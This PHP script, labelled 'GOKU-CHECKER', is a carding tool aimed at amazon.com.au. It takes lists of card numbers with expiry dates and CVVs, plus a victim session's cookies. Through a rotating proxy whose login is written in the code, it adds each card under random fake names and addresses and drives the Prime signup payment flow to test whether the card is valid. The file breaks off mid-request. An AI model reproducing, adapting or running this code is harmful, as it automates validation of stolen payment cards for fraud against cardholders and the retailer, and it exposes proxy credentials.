<?php
error_reporting(0);

function getstr($string, $start, $end){

$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];

}

function getstr2($string, $start, $end, $line = 1) {

$str = explode($start, $string);
$str = explode($end, $str[$line]);
return $str[0];

}

function multiexplode($delimiters, $string){

$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;

}

$lista = str_replace(array(" "), '/', $_POST['lista']);
// $lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">GOKU-CHECKER</span><br>');
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function gerarLetrasAleatorias($quantidade) {
$letras = 'abcdefghijklmnopqrstuvwxyz';
$tamanhoLetras = strlen($letras);
$resultado = '';

for ($i = 0; $i < $quantidade; $i++) {
$indice = rand(0, $tamanhoLetras - 1);
$resultado .= $letras[$indice];
}

return $resultado;
}

$quantidadeLetras = 7; 
$letrasAleatorias = gerarLetrasAleatorias($quantidadeLetras);

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

// $cookieprim = $_GET['cookies'];

$cookieprim = $_POST['cookies'];

if($cookieprim == null){

die("Coloque os cookies da amazon.com.au no formulário de salvar cookies!");    
    
}

$cookieprim = trim($cookieprim);

function convertCookie($text, $outputFormat = 'BR'){
$countryCodes = [
'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
];

if (!array_key_exists($outputFormat, $countryCodes)) {
return $text;
}

$currentCountry = $countryCodes[$outputFormat];

$text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
$text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
$text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
$text = str_replace('acbuc', $currentCountry['code'], $text);

return $text;
}

function generateRandomString($length = 12) {
$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];
}
return $randomString;
}

$_com_cookie = convertCookie($cookieprim, 'US');
$tries = 3;

// Configuración del proxy rotativo
$proxy = "http://ea125363a7880b18:SRbljVAY:res.proxy-seller.com:10000";

///////////////////////////////////////////////////////////////////////////////////////

function getStateAbbreviation($state) {
    $states = [
        'Alabama' => 'AL', 'Alaska' => 'AK', 'Arizona' => 'AZ', 'Arkansas' => 'AR',
        'California' => 'CA', 'Colorado' => 'CO', 'Connecticut' => 'CT', 'Delaware' => 'DE',
        'Florida' => 'FL', 'Georgia' => 'GA', 'Hawaii' => 'HI', 'Idaho' => 'ID',
        'Illinois' => 'IL', 'Indiana' => 'IN', 'Iowa' => 'IA', 'Kansas' => 'KS',
        'Kentucky' => 'KY', 'Louisiana' => 'LA', 'Maine' => 'ME', 'Maryland' => 'MD',
        'Massachusetts' => 'MA', 'Michigan' => 'MI', 'Minnesota' => 'MN', 'Mississippi' => 'MS',
        'Missouri' => 'MO', 'Montana' => 'MT', 'Nebraska' => 'NE', 'Nevada' => 'NV',
        'New Hampshire' => 'NH', 'New Jersey' => 'NJ', 'New Mexico' => 'NM', 'New York' => 'NY',
        'North Carolina' => 'NC', 'North Dakota' => 'ND', 'Ohio' => 'OH', 'Oklahoma' => 'OK',
        'Oregon' => 'OR', 'Pennsylvania' => 'PA', 'Rhode Island' => 'RI', 'South Carolina' => 'SC',
        'South Dakota' => 'SD', 'Tennessee' => 'TN', 'Texas' => 'TX', 'Utah' => 'UT',
        'Vermont' => 'VT', 'Virginia' => 'VA', 'Washington' => 'WA', 'West Virginia' => 'WV',
        'Wisconsin' => 'WI', 'Wyoming' => 'WY'
    ];
    return $states[$state] ?? 'NY';
}

$time = time();

///////////////////////////////////////////////////////////////////////////////////////

$first_name = $letrasAleatorias;
$last_name = $letrasAleatorias;
$fullnamekk = "$first_name $last_name";
$street = "1389 Tchesinkut Lake Rd";
$city = "Fort Fraser";
$state = "British Columbia";
$country = "United States";
$postcode = "V0J 1N0";

///////////////////////////////////////////////////////////////////////////////////////

$cookie2 = convertCookie($cookieprim, 'US');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com.au/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com.au',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.dee.app',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$csrf = getstr($r, 'csrfToken = "','"');

if ($csrf == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao obter acesso passkey, clique em "Minha conta" e depois "Segurança" e faça login novamente. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com.au/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.$letrasAleatorias.'+'.$letrasAleatorias.'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com.au',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com.au',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com.au/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');

if (strpos($r, 'paymentInstrumentId')) {} else{

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');
}

///////////////////////////////////////////////////////////////////////////////////////

function adicionarEnderecoAmazon($cookie2){
global $proxy, $letrasAleatorias;

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.com.au/a/addresses/add?ref=ya_address_book_add_button',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_PROXY => $proxy,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'host: www.amazon.com.au',
    'referer: https://www.amazon.com.au/a/addresses?ref_=ya_d_c_addr&claim_type=EmailAddress&new_account=1&',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);
$getAddressAmazon = curl_exec($curl);
curl_close($curl);

///////////////////////////////////////////////////////////////////////////////////////

$csrftokenaddress = urlencode(getStr($getAddressAmazon, "type='hidden' name='csrfToken' value='","'"));
$addressfromjwt = getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-previous-address-form-state-token" value="','"');
$customeriddkk = getstr($getAddressAmazon, '"customerID":"','"');
$interactionidd = getStr($getAddressAmazon, 'name="address-ui-widgets-address-wizard-interaction-id" value="','"');
$starttimekk = getStr($getAddressAmazon, 'name="address-ui-widgets-form-load-start-time" value="','"');
$requestidd = getStr($getAddressAmazon, '=AddView&hostPageRID=','&' , 1);
$csrftokv2 = urlencode(getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-csrfToken" value="','"'));
$randotelefone = rand(1111,9999);

///////////////////////////////////////////////////////////////////////////////////////

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.com.au/a/addresses/add?ref=ya_address_book_add_post',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_PROXY => $proxy,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'csrfToken='.$csrftokenaddress.'&addressID=&address-ui-widgets-countryCode=AU&address-ui-widgets-enterAddressFullName='.$letrasAleatorias.'+'.$letrasAleatorias.'&address-ui-widgets-enterAddressPhoneNumber=%2B1313325'.$randotelefone.'&address-ui-widgets-enterAddressLine1=76+Beach+Road&address-ui-widgets-enterAddressLine2=&address-ui-widgets-enterAddressPostalCode=7050&address-ui-widgets-enterAddressCity=KINGSTON+BEACH&address-ui-widgets-enterAddressStateOrRegion=TAS&address-ui-widgets-previous-address-form-state-token='.$addressfromjwt.'&address-ui-widgets-use-as-my-default=true&address-ui-widgets-delivery-instructions-desktop-expander-context=%7B%22deliveryInstructionsDisplayMode%22+%3A+%22CDP_ONLY%22%2C+%22deliveryInstructionsClientName%22+%3A+%22YourAccountAddressBook%22%2C+%22deliveryInstructionsDeviceType%22+%3A+%22desktop%22%2C+%22deliveryInstructionsIsEditAddressFlow%22+%3A+%22false%22%7D&address-ui-widgets-addressFormButtonText=save&address-ui-widgets-addressFormHideHeading=true&address-ui-widgets-heading-string-id=&address-ui-widgets-addressFormHideSubmitButton=false&address-ui-widgets-enableAddressDetails=true&address-ui-widgets-returnLegacyAddressID=false&address-ui-widgets-enableDeliveryInstructions=true&address-ui-widgets-enableAddressWizardInlineSuggestions=true&address-ui-widgets-enableEmailAddress=false&address-ui-widgets-enableAddressTips=true&address-ui-widgets-amazonBusinessGroupId=&address-ui-widgets-clientName=YourAccountAddressBook&address-ui-widgets-enableAddressWizardForm=true&address-ui-widgets-delivery-instructions-data=%7B%22initialCountryCode%22%3A%22AU%22%7D&address-ui-widgets-ab-delivery-instructions-data=&address-ui-widgets-address-wizard-interaction-id='.$interactionidd.'&address-ui-widgets-obfuscated-customerId='.$customeriddkk.'&address-ui-widgets-locationData=&address-ui-widgets-enableLatestAddressWizardForm=true&address-ui-widgets-avsSuppressSoftblock=true&address-ui-widgets-avsSuppressSuggestion=true&address-ui-widgets-csrfToken='.$csrftokv2.'&address-ui-widgets-form-load-start-time='.$starttimekk.'&address-ui-widgets-clickstream-related-request-id='.$requestidd.'&address-ui-widgets-locale=',
  CURLOPT_HTTPHEADER => [
    'content-type: application/x-www-form-urlencoded',
    'host: www.amazon.com.au',
    'origin: https://www.amazon.com.au',
    'referer: https://www.amazon.com.au/a/addresses/add?ref=ya_address_book_add_button',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);

$addAddressValid = curl_exec($curl);
curl_close($curl);

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com.au/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com.au',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com.au',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com.au/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$addresid = getStr($r, 'AddressId":"','"');

if(empty($addresid)) {

adicionarEnderecoAmazon($cookie2);

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Um endereço foi cadatrado, confira em sua conta e tente novamente. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com.au/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com.au',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com.au',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com.au/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com.au/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com.au',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.mShop.android.shopping',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$market = getstr($r, "ue_mid = '","'");
$wigstst = getStr($r, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"','"');
$customerId = getStr($r, 'customerId":"','"');
$widgetInstanceId = getStr($r, 'widgetInstanceId":"','"');
$session_id   = getstr($r, '"sessionId":"', '"');
$removdps   = getstr($r, '"testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com.au/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'ppw-jsEnabled=true&ppw-widgetState='.$wigstst.'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId='.$cardid_puro.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com.au',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/'.$widgetInstanceId.'',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.amazon.com.au',
'Referer: https://www.amazon.com.au/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',

)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$payment = getStr($r, '"paymentMethodId\":\"','\"');
$cookie2 = convertCookie($cookieprim, 'AU');

///////////////////////////////////////////////////////////////////////////////////////

$cookieUS1 = 'amazon.com.au';

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://".$cookieUS1."/gp/prime/pipeline/membersignup",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1",
CURLOPT_HTTPHEADER     => array(
"Host: $cookieUS1",
"content-type: application/x-www-form-urlencoded",
),
]);

$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$wid9090 = getstr($result, 'ppw-widgetState&quot; value=&quot;','&');
$sessionds = getstr($result, 'Subs:Prime&quot;,&quot;session&quot;:&quot;','&');
$customerID = getstr($result, 'customerId&quot;:&quot;','&');
$noovotoken = getstr($result, ',&amp;quot;instrumentIds&amp;quot;:[&amp;quot;','&');
$ohtoken1 = getstr($result, 'payment-preference-summary-form&quot;,&quot;selectedInstrumentIds&quot;:[&quot;','&');
$ohtoken2 = getstr($result, 'Subs:Prime&quot;,&quot;serializedState&quot;:&quot;','&');

///////////////////////////////////////////////////////////////////////////////////////

$brurloa92 = 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $brurloa92);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken2."&ie=UTF-8");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/confirm';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$ohtoken3 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
$ohtoken4 = getstr($result, 'data-instrument-id=\"','\"');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/r9R8zQ8Dgh1b';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/membersignup';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$walletid2 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://www.$cookieUS1/payments-portal/data/widgets2/v1/customer/".$customerID."/continueWidget",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent",
CURLOPT_HTTPHEADER     => array(
"Host: www.$cookieUS1",
$headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
"content-type: application/x-www-form-urlencoded",
),
]);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$walletid = getstr($result, 'preferencePaymentMethodIds":"[\"','\"');

///////////////////////////////////////////////////////////////////////////////////////
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sessionds.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
